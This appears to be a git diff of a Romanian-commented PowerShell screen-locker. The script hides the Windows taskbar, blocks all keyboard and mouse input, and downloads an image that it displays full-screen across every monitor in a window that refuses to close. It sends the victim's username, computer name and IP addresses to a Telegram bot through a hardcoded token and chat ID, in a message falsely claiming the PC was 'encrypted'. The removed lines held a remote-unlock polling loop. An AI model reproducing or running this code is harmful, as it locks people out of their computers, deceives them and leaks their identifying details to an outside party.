@@ -6,65 +6,66 @@ Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Native {
-    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
-    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+    [DllImport("user32.dll")]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 
-# Config
+# ▶️ INFO TELEGRAM
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
-$chatID = '656189986'
-$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
 
-# IP-uri
+# IP local
 $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
-    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' })[0].IPAddress
-try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { $ipPublic = "n/a" }
+    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
 
-# Trimite mesaj Telegram
-$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
-$uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
-$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
+# IP public
 try {
-    Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json'
-} catch { Write-Host "Eroare Telegram: $_" }
+    $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
+} catch {
+    $ipPublic = "n/a"
+}
 
-# Ascunde Taskbar & blochează input
+# Mesaj Telegram
+$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
+
+# Trimite în Telegram
+$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
+$body = @{
+    'chat_id' = '656189986'
+    'text'    = $message
+} | ConvertTo-Json -Compress
+
+try {
+    Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
+} catch {}
+
+# ▶️ Ascunde Taskbar și blochează input
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
 [Native]::BlockInput($true)
 
-# Descarcă imaginea
+# ▶️ Descarcă imaginea
 $temp = "$env:TEMP\poza_laptop.jpg"
-try {
-    Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
-} catch {
-    [Native]::BlockInput($false)
-    Write-Host "Eroare descărcare imagine"
-    exit
-}
+Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# Dimensiune totală pe toate monitoarele
+# ▶️ Calculează rezoluția totală a monitoarelor
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
-$minX = ($bounds | ForEach-Object X) | Measure-Object -Minimum | Select -ExpandProperty Minimum
-$minY = ($bounds | ForEach-Object Y) | Measure-Object -Minimum | Select -ExpandProperty Minimum
-$maxX = ($bounds | ForEach-Object Right) | Measure-Object -Maximum | Select -ExpandProperty Maximum
-$maxY = ($bounds | ForEach-Object Bottom) | Measure-Object -Maximum | Select -ExpandProperty Maximum
-$width = $maxX - $minX
-$height = $maxY - $minY
+$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
+$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
+$maxRight = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
+$maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
+$width = $maxRight - $minX
+$height = $maxBottom - $minY
 
+# ▶️ Variabilă de control
 $script:inchis = $false
 
-function InchideTot {
-    $script:inchis = $true
-    [Native]::BlockInput($false)
-    [Native]::ShowWindow($taskbar, 1)
-    $form.Invoke([Action]{ $form.Close() })
-}
-
-# Fereastra principală
+# ▶️ Creează fereastra mare
 $form = New-Object Windows.Forms.Form
 $form.StartPosition = 'Manual'
 $form.Location = New-Object Drawing.Point $minX, $minY
@@ -83,30 +84,22 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
+# ▶️ Închide la tasta C
 $form.Add_KeyDown({
-    if ($_.KeyCode -eq 'C') { InchideTot }
+    if ($_.KeyCode -eq 'C') {
+        $script:inchis = $true
+        $form.Close()
+    }
 })
+
 $form.Add_FormClosing({
     if (-not $script:inchis) { $_.Cancel = $true }
 })
 
-# Buclă paralelă de verificare mesaje Telegram (într-un thread)
-Start-Job -ScriptBlock {
-    while ($true) {
-        try {
-            $updates = Invoke-RestMethod "https://api.telegram.org/bot$using:botToken/getUpdates"
-            foreach ($update in $updates.result) {
-                $txt = $update.message.text
-                if ($txt -eq "👍 $using:user" -or $txt -eq "👍 $using:pc") {
-                    Stop-Job -Id $MyInvocation.MyCommand.Id -Force
-                    $null = [System.Windows.Forms.Application]::OpenForms[0].Invoke([Action]{ $using:InchideTot.Invoke() })
-                }
-            }
-        } catch {}
-        Start-Sleep -Seconds 5
-    }
-} | Out-Null
-
-# Rulează aplicația
+# ▶️ Rulează aplicația
 $form.Show()
 [System.Windows.Forms.Application]::Run($form)
+
+# ▶️ Deblochează după închidere
+[Native]::BlockInput($false)
+[Native]::ShowWindow($taskbar, 1)
